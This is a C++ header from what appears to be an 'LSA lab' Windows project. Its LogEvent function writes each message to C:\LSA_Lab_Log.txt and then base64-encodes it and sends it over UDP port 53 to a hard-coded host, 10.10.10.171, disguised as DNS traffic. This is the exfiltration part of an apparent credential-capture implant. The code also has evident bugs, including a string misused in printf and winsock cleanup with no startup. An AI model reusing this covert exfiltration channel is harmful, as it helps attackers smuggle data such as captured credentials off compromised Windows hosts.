#pragma once
#pragma comment(lib, "ws2_32.lib")

#include <string>
#include <fstream>
#include <mutex>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>

// Winsock2 MUST come AFTER windows.h (with lean define)
#define WIN32_LEAN_AND_MEAN
#define _WINSOCKAPI_ // prevent winsock.h inclusion
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

/* --- Simple Base64 Encoding --- */
static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char *base64_encode(const unsigned char *data, size_t input_length, size_t *output_length) {
    *output_length = 4 * ((input_length + 2) / 3);
    char *encoded_data = (char*)malloc(*output_length + 1);
    if (!encoded_data) return NULL;

    for (size_t i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? data[i++] : 0;
        uint32_t octet_b = i < input_length ? data[i++] : 0;
        uint32_t octet_c = i < input_length ? data[i++] : 0;

        uint32_t triple = (octet_a << 16) | (octet_b << 8) | octet_c;

        encoded_data[j++] = b64_table[(triple >> 18) & 0x3F];
        encoded_data[j++] = b64_table[(triple >> 12) & 0x3F];
        encoded_data[j++] = b64_table[(triple >> 6) & 0x3F];
        encoded_data[j++] = b64_table[triple & 0x3F];
    }

    size_t mod = input_length % 3;

    if (mod > 0) {
        encoded_data[*output_length - 1] = '=';
        if (mod == 1) {
            encoded_data[*output_length - 2] = '=';
        }
    }

    encoded_data[*output_length] = '\0';
    return encoded_data;
}

void sendPacket(const std::string& msg){
    const char *plainText = msg.data(); 
    size_t b64_len;
    char *b64names = base64_encode((const unsigned char *)plainText, strlen(plainText), &b64_len);
    if (!b64names) {
        fprintf(stderr, "Base64 encoding failed\n");
        return;
    }

    std::string dnsServerInput = "10.10.10.171";

    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(53);

    // Validate IP
    if (inet_pton(AF_INET, dnsServerInput.data(), &serverAddr.sin_addr) <= 0) {
        printf("Invalid IP address: %s. Using default: 10.10.10.171\n", dnsServerInput);
        inet_pton(AF_INET, "10.10.10.171", &serverAddr.sin_addr);
    }

    // Create socket
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return;
    }

    // Send data
    int sent = sendto(sock, b64names, strlen(b64names), 0,
                      (struct sockaddr *)&serverAddr, sizeof(serverAddr));

    if (sent == SOCKET_ERROR) {
        printf("Error sending DNS query: %d\n", WSAGetLastError());
    } else {
        printf("Sent %d bytes\n", sent);
    }

    closesocket(sock);
    WSACleanup();
    return;
}

inline std::string GetTimestamp()
{
    SYSTEMTIME st;
    GetLocalTime(&st);

    char buffer[64];
    sprintf_s(buffer, "[%04d-%02d-%02d %02d:%02d:%02d]",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond);

    return std::string(buffer);
}

std::mutex logMutex;

void LogEvent(const std::string& msg)
{
    std::lock_guard<std::mutex> lock(logMutex);

    HANDLE hFile = CreateFileA(
        "C:\\LSA_Lab_Log.txt",
        FILE_APPEND_DATA,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE)
        return;

    // Write to Log file
    DWORD written;
    std::string line = msg + "\r\n";

    WriteFile(hFile, line.c_str(), (DWORD)line.size(), &written, NULL);
    CloseHandle(hFile);

    sendPacket(msg);
}
